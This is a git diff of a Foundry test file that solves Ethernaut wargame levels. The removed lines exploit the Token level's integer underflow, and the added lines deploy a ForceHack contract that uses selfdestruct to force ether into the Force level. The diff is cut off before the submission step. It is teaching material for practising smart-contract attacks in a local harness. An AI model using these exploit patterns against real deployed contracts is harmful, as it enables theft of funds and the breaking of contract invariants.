@@ -3,11 +3,12 @@ pragma solidity ^0.8.14;
 
 import "forge-std/Test.sol";
 import "forge-std/console.sol";
-import "../src/Token/TokenFactory.sol";
+import "../src/Force/ForceFactory.sol";
+import "../src/Force/ForceHack.sol";
 import "../src/Ethernaut.sol";
 
-// forge test --match-contract TokenTest -vvvv
-contract TokenTest is Test {
+// forge test --match-contract ForceTest -vvvv
+contract ForceTest is Test {
     Ethernaut ethernaut;
     address player = address(100);
 
@@ -17,25 +18,22 @@ contract TokenTest is Test {
         vm.deal(player, 5 ether); // give our address 5 ether
     }
 
-    function testTokenHack() public {
+    function testForceHack() public {
         /****************
          * Factory setup *
          *************** */
-        TokenFactory tokenFactory = new TokenFactory();
-        ethernaut.registerLevel(tokenFactory);
+        ForceFactory forceFactory = new ForceFactory();
+        ethernaut.registerLevel(forceFactory);
         vm.startPrank(player);
-        address levelAddress = ethernaut.createLevelInstance(tokenFactory);
-        Token ethernautToken = Token(payable(levelAddress)); // 1000 is initial supply
-        vm.stopPrank();
+        address levelAddress = ethernaut.createLevelInstance(forceFactory);
+        Force ethernautForce = Force(payable(levelAddress)); // 1000 is initial supply
         /****************
          *    Attack     *
          *************** */
-        // this level is a classic example of overflow, which is now prevented by default in Sol ^8.0.0
-        vm.startPrank(address(200)); // need to use another address
-        // default _initialSupply is set to 20
-        ethernautToken.transfer(player, 2**256 - 21); // transfer a quantity of token > 2**256
-        vm.stopPrank();
-        vm.startPrank(player);
+        // simply instanciate the contract and the selfdestruct method will be called on the base contract
+        ForceHack forceHack = new ForceHack{value: 1 ether}(
+            payable(levelAddress)
+        );
 
         /*****************
          *Level Submission*
